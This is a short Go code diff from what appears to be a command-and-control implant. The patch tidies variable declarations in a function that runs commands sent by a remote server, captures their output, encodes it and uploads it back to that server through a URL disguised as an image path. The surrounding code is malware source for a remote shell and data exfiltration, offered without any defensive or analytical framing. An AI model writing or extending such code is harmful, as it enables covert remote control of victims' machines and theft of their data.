@@ -51,21 +51,19 @@ func ExecC2Shell(debug bool, server string, guid string) error {
 
 func ExecuteAndRespond(debug bool, server string, guid string, body []byte) error {
 	var (
-		url = server + "/images/c/cr.png"
-		err error
+		url  = server + "/images/c/cr.png"
+		err  error
+		cmd  *exec.Cmd
+		data string
 	)
 	PrintDebug(debug, "Executing command: %s", strings.Replace(string(body), ":", " ", -1))
 	commands := strings.Split(string(body), ":")
-	cmd := exec.Command(commands[0], commands[1:]...)
-	if err != nil {
-		PrintDebug(debug, "Error executing command %v", err)
-		return err
-	}
+	cmd = exec.Command(commands[0], commands[1:]...)
 	output, _ := cmd.CombinedOutput()
 	PrintDebug(debug, "_ "+string(output))
 
 	// upload this to the server
-	data, _ := EncodeString(debug, string(output))
+	data, _ = EncodeString(debug, string(output))
 	PrintDebug(debug, "Uploading output to %s", url)
 	client := &http.Client{}
 	req, _ := http.NewRequest("GET", url, nil)
